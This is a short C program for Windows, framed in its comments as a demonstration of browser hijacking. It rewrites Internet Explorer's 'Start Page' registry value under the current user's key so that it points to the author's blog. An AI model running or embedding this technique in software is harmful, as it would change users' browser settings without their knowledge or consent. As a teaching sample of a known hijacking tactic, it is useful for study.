#include <stdio.h>
#include <windows.h>

// Will change Internet Explorer's (IE) Start Page by modifying the registry key to point to my blog
// Possible tactic that browser hijacking may employ
// Author: Issac @1d8
// Date: 29 March 2024

char szStartPageKey[] = {"Software\\Microsoft\\Internet Explorer\\Main"};
char szMaliciousStartPage[] = {"https://1d8.github.io"}; // NOt really malicious, just a cool blog (: 
char szMyappSubKey[] = {"Start Page"};


int main() {
    HKEY hKey;
    LSTATUS openResult, setResult;
    openResult = RegOpenKeyEx(HKEY_CURRENT_USER, szStartPageKey, 0, KEY_ALL_ACCESS, &hKey);
    if (openResult != ERROR_SUCCESS) {
        // Error encountered while opening registry key
        if (openResult == ERROR_FILE_NOT_FOUND) {
            printf("Key not found\n");
            return 0;
        } else {
            printf("Error opening key!\n");
            return 0;
        }
    } else {
        // Successfully opened registry key
        setResult = RegSetValueEx(hKey, szMyappSubKey, 0, REG_SZ, szMaliciousStartPage, sizeof(szMaliciousStartPage));
        if (setResult != ERROR_SUCCESS) {
            printf("Error encountered while setting registry key value");
            return 0;
        } else {
            printf("Changed IE's start page!");
            return 0;
        }
    }
}
